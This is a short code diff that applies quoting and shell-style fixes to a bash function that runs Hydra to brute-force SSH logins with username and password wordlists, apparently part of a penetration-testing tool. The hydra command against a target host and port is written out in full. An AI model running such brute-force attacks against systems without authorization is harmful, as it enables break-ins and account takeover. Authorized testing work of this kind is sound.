@@ -203,7 +203,7 @@ run_attack() {
         log_info "Testing $word_count passwords..."
         
         # Update attempt tracking for report
-        update_attack_attempts $word_count
+        update_attack_attempts "$word_count"
         
         # Run hydra with enhanced error capture
         local output_file
@@ -214,11 +214,11 @@ run_attack() {
         realtime_status "running" "Hydra attack initiated - watch for real-time results..."
         
         hydra -L "$username_file" -P "$wordlist" \
-              -t $THREADS \
-              -w $TIMEOUT \
+              -t "$THREADS" \
+              -w "$TIMEOUT" \
               -o "$output_file" \
               -f \
-              ssh://$TARGET:$PORT 2>"$error_file" | while IFS= read -r line; do
+              ssh://"$TARGET":"$PORT" 2>"$error_file" | while IFS= read -r line; do
             
             # Real-time progress feedback
             if [[ $line == *"[ATTEMPT]"* ]] || [[ $line == *"[STATUS]"* ]]; then
@@ -251,7 +251,8 @@ run_attack() {
         
         # Check exit status and error output
         local exit_code=$?
-        local error_output=$(cat "$error_file" 2>/dev/null)
+        local error_output
+        error_output=$(cat "$error_file" 2>/dev/null)
         
         if [ $exit_code -eq 0 ] && [ -s "$output_file" ]; then
             realtime_status "success" "Attack completed successfully"
